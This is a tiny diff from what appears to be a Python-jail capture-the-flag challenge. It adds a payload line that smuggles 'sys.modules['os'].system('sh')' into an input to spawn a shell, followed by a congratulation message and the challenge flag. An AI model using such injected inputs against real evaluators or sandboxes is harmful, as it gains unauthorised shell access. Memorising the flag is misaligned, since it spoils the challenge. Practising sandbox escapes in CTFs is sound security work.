@@ -1,0 +1,7 @@
+bomb|sys.modules['os'].system('sh')|a
+
+
+
+  G00000000d !! :)
+  I think you are familiar with Python !
+  FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}
